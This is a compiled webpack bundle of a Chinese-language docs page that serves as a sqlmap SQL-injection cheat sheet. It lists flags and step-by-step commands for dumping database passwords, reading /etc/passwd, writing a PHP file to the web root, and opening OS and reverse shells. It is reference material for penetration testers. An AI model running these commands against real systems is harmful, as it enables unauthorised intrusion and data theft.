"use strict";(self.webpackChunktreasure_house=self.webpackChunktreasure_house||[]).push([[3249],{7006:(s,e,n)=>{n.r(e),n.d(e,{assets:()=>o,contentTitle:()=>t,default:()=>d,frontMatter:()=>a,metadata:()=>m,toc:()=>u});var l=n(4848),r=n(8453);const a={},t="sqlmap-sql\u6ce8\u5165\u81ea\u52a8\u5316\u5de5\u5177",m={id:"Devops/sqlmap/index",title:"sqlmap-sql\u6ce8\u5165\u81ea\u52a8\u5316\u5de5\u5177",description:"\u5b98\u7f51",source:"@site/docs/Devops/sqlmap/index.md",sourceDirName:"Devops/sqlmap",slug:"/Devops/sqlmap/",permalink:"/docs/Devops/sqlmap/",draft:!1,unlisted:!1,editUrl:"https://github.com/Randark-JMT/Treasure-House/edit/main/docs/Devops/sqlmap/index.md",tags:[],version:"current",frontMatter:{},sidebar:"Devops_Sidebar",previous:{title:"one for all -\u5b50\u57df\u540d\u6536\u96c6\u5de5\u5177",permalink:"/docs/Devops/oneforall/"}},o={},u=[{value:"\u5b98\u7f51",id:"\u5b98\u7f51",level:2},{value:"\u57fa\u7840\u53c2\u6570",id:"\u57fa\u7840\u53c2\u6570",level:2},{value:"\u5e38\u7528\u547d\u4ee4",id:"\u5e38\u7528\u547d\u4ee4",level:2},{value:"\u5b8c\u6574\u7684\u4e00\u5957\u64cd\u4f5c",id:"\u5b8c\u6574\u7684\u4e00\u5957\u64cd\u4f5c",level:2},{value:"\u83b7\u53d6\u4fe1\u606f\u7c7b\u547d\u4ee4",id:"\u83b7\u53d6\u4fe1\u606f\u7c7b\u547d\u4ee4",level:2}];function p(s){const e={a:"a",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,r.R)(),...s.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(e.h1,{id:"sqlmap-sql\u6ce8\u5165\u81ea\u52a8\u5316\u5de5\u5177",children:"sqlmap-sql\u6ce8\u5165\u81ea\u52a8\u5316\u5de5\u5177"}),"\n",(0,l.jsx)(e.h2,{id:"\u5b98\u7f51",children:(0,l.jsx)(e.a,{href:"https://github.com/sqlmapproject/sqlmap",children:"\u5b98\u7f51"})}),"\n",(0,l.jsx)(e.p,{children:(0,l.jsx)(e.img,{alt:"1709951852290",src:n(9310).A+"",width:"836",height:"321"})}),"\n",(0,l.jsx)(e.h2,{id:"\u57fa\u7840\u53c2\u6570",children:"\u57fa\u7840\u53c2\u6570"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{children:"-u #\u6ce8\u5165\u70b9\n-g \u8c37\u6b4c\u641c\u7d22\n-f #\u6307\u7eb9\u5224\u522b\u6570\u636e\u5e93\u7c7b\u578b\n-b #\u83b7\u53d6\u6570\u636e\u5e93\u7248\u672c\u4fe1\u606f\n-p #\u6307\u5b9a\u53ef\u6d4b\u8bd5\u7684\u53c2\u6570(?page=1&id=2 -p \u201cpage,id\u201d)\n-D \u201c\u201d #\u6307\u5b9a\u6570\u636e\u5e93\u540d\n-T \u201c\u201d #\u6307\u5b9a\u8868\u540d\n-C \u201c\u201d #\u6307\u5b9a\u5b57\u6bb5\n-s \u201c\u201d #\u4fdd\u5b58\u6ce8\u5165\u8fc7\u7a0b\u5230\u4e00\u4e2a\u6587\u4ef6,\u8fd8\u53ef\u4e2d\u65ad\uff0c\u4e0b\u6b21\u6062\u590d\u5728\u6ce8\u5165(\u4fdd\u5b58\uff1a-s \u201cxx.log\u201d\u3000\u3000\u6062\u590d:-s \u201cxx.log\u201d \u2013resume)\n\u2013columns #\u5217\u51fa\u5b57\u6bb5\n\u2013current-user #\u83b7\u53d6\u5f53\u524d\u7528\u6237\u540d\u79f0\n\u2013current-db #\u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u540d\u79f0\n\u2013users #\u5217\u6570\u636e\u5e93\u6240\u6709\u7528\u6237\n\u2013passwords #\u6570\u636e\u5e93\u7528\u6237\u6240\u6709\u5bc6\u7801\n\u2013privileges #\u67e5\u770b\u7528\u6237\u6743\u9650(\u2013privileges -U root)\n-U #\u6307\u5b9a\u6570\u636e\u5e93\u7528\u6237\n\u2013dbs #\u5217\u51fa\u6240\u6709\u6570\u636e\u5e93\n\u2013tables -D \u201c\u201d #\u5217\u51fa\u6307\u5b9a\u6570\u636e\u5e93\u4e2d\u7684\u8868\n\u2013columns -T \u201cuser\u201d -D \u201cmysql\u201d #\u5217\u51famysql\u6570\u636e\u5e93\u4e2d\u7684user\u8868\u7684\u6240\u6709\u5b57\u6bb5\n\u2013dump-all #\u5217\u51fa\u6240\u6709\u6570\u636e\u5e93\u6240\u6709\u8868\n\u2013exclude-sysdbs #\u53ea\u5217\u51fa\u7528\u6237\u81ea\u5df1\u65b0\u5efa\u7684\u6570\u636e\u5e93\u548c\u8868\n\u2013dump -T \u201c\u201d -D \u201c\u201d -C \u201c\u201d #\u5217\u51fa\u6307\u5b9a\u6570\u636e\u5e93\u7684\u8868\u7684\u5b57\u6bb5\u7684\u6570\u636e(\u2013dump -T users -D master -C surname)\n\u2013dump -T \u201c\u201d -D \u201c\u201d \u2013start 2 \u2013top 4 # \u5217\u51fa\u6307\u5b9a\u6570\u636e\u5e93\u7684\u8868\u76842-4\u5b57\u6bb5\u7684\u6570\u636e\n\u2013dbms #\u6307\u5b9a\u6570\u636e\u5e93(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)\n\u2013os #\u6307\u5b9a\u7cfb\u7edf(Linux,Windows)\n\u2013sql -shell \u5199shell\n\u2013delay \u5ef6\u8fdf\u7684\u65f6\u95f4\n\u2013safe-freq \u6b21\u6570\n-v #\u8be6\u7ec6\u7684\u7b49\u7ea7(0-6)\n0\uff1a\u53ea\u663e\u793aPython\u7684\u56de\u6eaf\uff0c\u9519\u8bef\u548c\u5173\u952e\u6d88\u606f\u3002\n1\uff1a\u663e\u793a\u4fe1\u606f\u548c\u8b66\u544a\u6d88\u606f\u3002\n2\uff1a\u663e\u793a\u8c03\u8bd5\u6d88\u606f\u3002\n3\uff1a\u6709\u6548\u8f7d\u8377\u6ce8\u5165\u3002\n4\uff1a\u663e\u793aHTTP\u8bf7\u6c42\u3002\n5\uff1a\u663e\u793aHTTP\u54cd\u5e94\u5934\u3002\n6\uff1a\u663e\u793aHTTP\u54cd\u5e94\u9875\u9762\u7684\u5185\u5bb9\n\u2013privileges #\u67e5\u770b\u6743\u9650\n\u2013is-dba #\u662f\u5426\u662f\u6570\u636e\u5e93\u7ba1\u7406\u5458\n\u2013roles #\u679a\u4e3e\u6570\u636e\u5e93\u7528\u6237\u89d2\u8272\n\u2013udf-inject #\u5bfc\u5165\u7528\u6237\u81ea\u5b9a\u4e49\u51fd\u6570\uff08\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\uff09\n\u2013union-check #\u662f\u5426\u652f\u6301union \u6ce8\u5165\n\u2013union-cols #union \u67e5\u8be2\u8868\u8bb0\u5f55\n\u2013union-test #union \u8bed\u53e5\u6d4b\u8bd5\n\u2013union-use #\u91c7\u7528union \u6ce8\u5165\n\u2013union-tech orderby #union\u914d\u5408order by\n\u2013method \u201cPOST\u201d \u2013data \u201c\u201d #POST\u65b9\u5f0f\u63d0\u4ea4\u6570\u636e(\u2013method \u201cPOST\u201d \u2013data \u201cpage=1&id=2\u2033)\n\u2013cookie \u201c\u7528;\u53f7\u5206\u5f00\u201d #cookie\u6ce8\u5165(\u2013cookies=\u201dPHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low\u201d)\n\u2013referer \u201c\u201d #\u4f7f\u7528referer\u6b3a\u9a97(\u2013referer \u201chttp://www.baidu.com\u201d)\n\u2013user-agent \u201c\u201d #\u81ea\u5b9a\u4e49user-agent\n\u2013proxy \u201chttp://127.0.0.1:8118\u2033 #\u4ee3\u7406\u6ce8\u5165\n\u2013string \u201c\u201d #\u6307\u5b9a\u5173\u952e\u8bcd\n\u2013threads \u3000\u3000 #\u91c7\u7528\u591a\u7ebf\u7a0b(\u2013threads 3)\n\u2013sql-shell #\u6267\u884c\u6307\u5b9asql\u547d\u4ee4\n\u2013sql-query #\u6267\u884c\u6307\u5b9a\u7684sql\u8bed\u53e5(\u2013sql-query \u201cSELECT password FROM mysql.user WHERE user = \u2018root\u2019 LIMIT 0, 1\u2033 )\n\u2013file-read #\u8bfb\u53d6\u6307\u5b9a\u6587\u4ef6\n\u2013file-write #\u5199\u5165\u672c\u5730\u6587\u4ef6(\u2013file-write /test/test.txt \u2013file-dest /var/www/html/1.txt;\u5c06\u672c\u5730\u7684test.txt\u6587\u4ef6\u5199\u5165\u5230\u76ee\u6807\u76841.txt)\n\u2013file-dest #\u8981\u5199\u5165\u7684\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84\n\u2013os-cmd=id #\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\n\u2013os-shell #\u7cfb\u7edf\u4ea4\u4e92shell\n\u2013os-pwn #\u53cd\u5f39shell(\u2013os-pwn \u2013msf-path=/opt/framework/msf3/)\n\u2013msf-path= #matesploit\u7edd\u5bf9\u8def\u5f84(\u2013msf-path=/opt/framework/msf3/)\n\u2013os-smbrelay #\n\u2013os-bof #\n\u2013reg-read #\u8bfb\u53d6win\u7cfb\u7edf\u6ce8\u518c\u8868\n\u2013priv-esc #\n\u2013time-sec= #\u5ef6\u8fdf\u8bbe\u7f6e \u9ed8\u8ba4\u2013time-sec=5 \u4e3a5\u79d2\n-p \u201cuser-agent\u201d \u2013user-agent \u201csqlmap/0.7rc1 (http://sqlmap.sourceforge.net)\u201d #\u6307\u5b9auser-agent\u6ce8\u5165\n"})}),"\n",(0,l.jsx)(e.h2,{id:"\u5e38\u7528\u547d\u4ee4",children:"\u5e38\u7528\u547d\u4ee4"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-./sqlmap.py",children:"./sqlmap.py -u \u201c\u6ce8\u5165\u5730\u5740\u201d -v 1 --current-db // \u5f53\u524d\u6570\u636e\u5e93\n./sqlmap.py -u \u201c\u6ce8\u5165\u5730\u5740\u201d -v 1 --users // \u5217\u6570\u636e\u5e93\u7528\u6237\n./sqlmap.py -u \u201c\u6ce8\u5165\u5730\u5740\u201d -v 1 --current-user // \u5f53\u524d\u7528\u6237\n./sqlmap.py -u \u201c\u6ce8\u5165\u5730\u5740\u201d -v 1 --tables -D \u201c\u6570\u636e\u5e93\u201d // \u5217\u4e3e\u6570\u636e\u5e93\u7684\u8868\u540d\n./sqlmap.py -u \u201c\u6ce8\u5165\u5730\u5740\u201d -v 1 --columns -T \u201c\u8868\u540d\u201d -D \u201c\u6570\u636e\u5e93\u201d // \u83b7\u53d6\u8868\u7684\u5217\u540d\n./sqlmap.py -u \u201c\u6ce8\u5165\u5730\u5740\u201d -v 1 --dump -C \u201c\u5b57\u6bb5,\u5b57\u6bb5\u201d -T \u201c\u8868\u540d\u201d -D \u201c\u6570\u636e\u5e93\u201d // \u83b7\u53d6\u8868\u4e2d\u7684\u6570\u636e\uff0c\u5305\u542b\u5217\n"})}),"\n",(0,l.jsx)(e.h2,{id:"\u5b8c\u6574\u7684\u4e00\u5957\u64cd\u4f5c",children:"\u5b8c\u6574\u7684\u4e00\u5957\u64cd\u4f5c"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{children:"1.\u8bfb\u53d6\u6570\u636e\u5e93\u7248\u672c\uff0c\u5f53\u524d\u7528\u6237\uff0c\u5f53\u524d\u6570\u636e\u5e93\nsqlmap -u \u6ce8\u5165\u5730\u5740 -f -b \u2013current-user \u2013current-db -v 1\n2.\u5224\u65ad\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237\u6743\u9650\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013privileges -U \u7528\u6237\u540d -v 1\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013is-dba -U \u7528\u6237\u540d -v 1\n3.\u8bfb\u53d6\u6240\u6709\u6570\u636e\u5e93\u7528\u6237\u6216\u6307\u5b9a\u6570\u636e\u5e93\u7528\u6237\u7684\u5bc6\u7801\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013users \u2013passwords -v 2\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013passwords -U root -v 2\n4.\u83b7\u53d6\u6240\u6709\u6570\u636e\u5e93\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013dbs -v 2\n5.\u83b7\u53d6\u6307\u5b9a\u6570\u636e\u5e93\u4e2d\u7684\u6240\u6709\u8868\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013tables -D mysql -v 2\n6.\u83b7\u53d6\u6307\u5b9a\u6570\u636e\u5e93\u540d\u4e2d\u6307\u5b9a\u8868\u7684\u5b57\u6bb5\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013columns -D mysql -T users -v 2\n7.\u83b7\u53d6\u6307\u5b9a\u6570\u636e\u5e93\u540d\u4e2d\u6307\u5b9a\u8868\u4e2d\u6307\u5b9a\u5b57\u6bb5\u7684\u6570\u636e\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013dump -D mysql -T users -C \u201cusername,password\u201d -s \u201csqlnmapdb.log\u201d -v 2\n8.file-read\u8bfb\u53d6web\u6587\u4ef6\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013file-read \u201c/etc/passwd\u201d -v 2\n9.file-write\u5199\u5165\u6587\u4ef6\u5230web\nsqlmap -u \u6ce8\u5165\u5730\u5740 \u2013file-write /localhost/mm.php \u2013file-dest\n"})}),"\n",(0,l.jsx)(e.h2,{id:"\u83b7\u53d6\u4fe1\u606f\u7c7b\u547d\u4ee4",children:"\u83b7\u53d6\u4fe1\u606f\u7c7b\u547d\u4ee4"}),"\n",(0,l.jsx)(e.pre,{children:(0,l.jsx)(e.code,{className:"language-sqlmap",children:'sqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --dbs#\u5217\u6570\u636e\u5e93\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d \u2013passwords #\u6570\u636e\u5e93\u7528\u6237\u5bc6\u7801\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d \u2013passwords-U root -v 0 #\u5217\u51fa\u6307\u5b9a\u7528\u6237\u6570\u636e\u5e93\u5bc6\u7801\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --dump-all -v 0 #\u5217\u51fa\u6240\u6709\u6570\u636e\u5e93\u6240\u6709\u8868\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d \u2013privileges #\u67e5\u770b\u6743\u9650\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d \u2013privileges -U root #\u67e5\u770b\u6307\u5b9a\u7528\u6237\u6743\u9650\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --is-dba -v 1 #\u662f\u5426\u662f\u6570\u636e\u5e93\u7ba1\u7406\u5458\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --roles #\u679a\u4e3e\u6570\u636e\u5e93\u7528\u6237\u89d2\u8272\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d \u2013udf-inject #\u5bfc\u5165\u7528\u6237\u81ea\u5b9a\u4e49\u51fd\u6570\uff08\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\uff01\uff09\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d \u2013dump-all --exclude-sysdbs -v 0 #\u5217\u51fa\u5f53\u524d\u5e93\u6240\u6709\u8868\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --union-check #\u662f\u5426\u652f\u6301union \u6ce8\u5165\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013union-cols #union \u67e5\u8be2\u8868\u8bb0\u5f55\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --union-test #union \u8bed\u53e5\u6d4b\u8bd5\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --union-use --banner #\u91c7\u7528union \u6ce8\u5165\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013union-test --union-tech orderby #union \u914d\u5408 order by\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013method \u201cPOST\u201d \u2013 data \u201cid=1&cat=2\u201d #post\u6ce8\u5165\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013cookie \u201cCOOKIE_VALUE\u201d #cookie\u6ce8\u5165\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d-b #\u83b7\u53d6banner\u4fe1\u606f\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d-level=3 --smart-v 1 -f #\u6307\u7eb9\u5224\u522b\u6570\u636e\u5e93\u7c7b\u578b\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d-level=3 --smart\u2013proxy"http://127.0.0.1:8118" #\u4ee3\u7406\u6ce8\u5165\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013string"STRING_ON_TRUE_PAGE" #\u6307\u5b9a\u5173\u952e\u8bcd\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013sql-shell #\u6267\u884c\u6307\u5b9asql\u547d\u4ee4\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013os-cmd=whoami #\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013os-shell #\u7cfb\u7edf\u4ea4\u4e92shell\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013os-pwn #\u53cd\u5f39shell\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d\u2013reg-read #\u8bfb\u53d6win\u7cfb\u7edf\u6ce8\u518c\u8868\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --dbs-o \u201csqlmap.log\u201d #\u4fdd\u5b58\u8fdb\u5ea6\nsqlmap -u \u201c\u6ce8\u5165\u5730\u5740\u201d\u2013level=3 --smart --dbms \u201cMysql\u201d --dbs -o \u201csqlmap.log\u201d --resume #\u6062\u590d\u5df2\u4fdd\u5b58\u8fdb\u5ea6\n'})})]})}function d(s={}){const{wrapper:e}={...(0,r.R)(),...s.components};return e?(0,l.jsx)(e,{...s,children:(0,l.jsx)(p,{...s})}):p(s)}},9310:(s,e,n)=>{n.d(e,{A:()=>l});const l=n.p+"assets/images/1709951852290-c6645acf42bf0d39007f6c0308acc3c6.png"},8453:(s,e,n)=>{n.d(e,{R:()=>t,x:()=>m});var l=n(6540);const r={},a=l.createContext(r);function t(s){const e=l.useContext(a);return l.useMemo((function(){return"function"==typeof s?s(e):{...e,...s}}),[e,s])}function m(s){let e;return e=s.disableParentContext?"function"==typeof s.components?s.components(r):s.components||r:t(s.components),l.createElement(a.Provider,{value:e},s.children)}}}]);